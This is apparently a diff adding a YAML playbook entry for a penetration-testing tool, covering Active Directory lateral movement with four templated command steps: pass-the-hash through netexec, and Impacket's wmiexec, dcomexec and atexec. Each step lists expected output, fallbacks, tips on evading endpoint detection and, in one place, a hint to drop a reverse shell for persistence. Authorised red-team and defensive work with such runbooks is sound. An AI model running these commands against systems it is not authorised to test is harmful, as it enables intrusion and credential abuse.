@@ -1,0 +1,85 @@
+id: lateral-movement
+name: Active Directory Lateral Movement & Execution
+category: ad
+description: Methods and tools for moving laterally across Windows domain workstations and servers using PsExec, WMI, WinRM, Pass-the-Hash, Overpass-the-Hash, DCOM, and Scheduled Tasks.
+port_triggers:
+  - 135
+  - 445
+  - 5985
+  - 5986
+service_triggers:
+  - smb
+  - winrm
+  - wmi
+  - rpc
+tags:
+  - lateral-movement
+  - psexec
+  - wmi
+  - winrm
+  - pass-the-hash
+  - dcom
+  - impacket
+steps:
+  - id: lateral-pass-the-hash-smb
+    title: Pass-the-Hash (PTH) SMB & WMI Execution
+    phase: exploitation
+    purpose: Execute commands or interactive shells remotely using an extracted NTLM hash without knowing the plaintext password.
+    command: netexec smb {{TARGET}} -u '{{USERNAME}}' -H '{{HASH}}' -d '{{DOMAIN|corp.local}}' -x 'whoami /priv'
+    expected_output:
+      - '[+] corp.local\\{{USERNAME}}:*** (Pwn3d!)'
+      - 'SeDebugPrivilege                Enabled'
+    common_mistakes:
+      - Pass full LM:NTLM format (e.g. `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0`) or just 32-char NT hash.
+    if_success: Remote execution verified! Proceed to spawn interactive shell via `psexec.py`, `wmiexec.py`, or `evil-winrm`.
+    if_failure: Access denied or UAC token filtering (`LocalAccountTokenFilterPolicy=0`). Try built-in RID 500 Administrator account.
+    references:
+      - https://wadcoms.github.io/
+
+  - id: lateral-wmiexec-interactive
+    title: WMI Execution via Impacket (Stealthy, No Service Created)
+    phase: exploitation
+    purpose: Execute commands stealthily over WMI (Port 135 & high RPC ports) without dropping binary services like PsExec.
+    command: wmiexec.py '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}'
+    expected_output:
+      - '[*] SMBv3.0 dialect used'
+      - '[*] Spawning semi-interactive shell'
+      - 'C:\>'
+    common_mistakes:
+      - WMI requires TCP port 135 and dynamic RPC high ports (49152-65535) open on firewall.
+    if_success: Semi-interactive command shell established on target system!
+    if_failure: RPC ports blocked by firewall. Fall back to SMB-based `smbexec.py` or WinRM.
+    references:
+      - https://github.com/fortra/impacket
+
+  - id: lateral-dcom-exec
+    title: DCOM Remote Execution (MMC20.Application / ShellWindows)
+    phase: exploitation
+    purpose: Execute code via Distributed Component Object Model (DCOM) objects to bypass endpoint detection monitoring PsExec/Service creation.
+    command: dcomexec.py '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}' -object MMC20
+    expected_output:
+      - '[*] Connecting to DCOM...'
+      - '[*] Object MMC20 instantiated'
+      - 'C:\>'
+    common_mistakes:
+      - Target must allow incoming DCOM requests and account must have administrative rights.
+    if_success: Interactive DCOM shell obtained!
+    if_failure: DCOM disabled or blocked. Try `-object ShellWindows` or `ShellBrowserWindow`.
+    references:
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/lateral-movement-dcom
+
+  - id: lateral-scheduled-tasks
+    title: Remote Scheduled Task Execution (Schtasks / Atexec)
+    phase: exploitation
+    purpose: Create and execute a one-time remote scheduled task to run an attacker payload or beacon with SYSTEM privileges.
+    command: atexec.py '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}@{{TARGET}}' 'whoami'
+    expected_output:
+      - '[*] Attempting to connect to Task Scheduler...'
+      - '[*] Task created successfully'
+      - '[*] Task output: nt authority\system'
+    common_mistakes:
+      - Task Scheduler service must be running and clock synchronized.
+    if_success: Code executed as NT AUTHORITY\SYSTEM! Drop reverse shell payload for persistence.
+    if_failure: Remote Task Scheduler RPC interface blocked.
+    references:
+      - https://wadcoms.github.io/
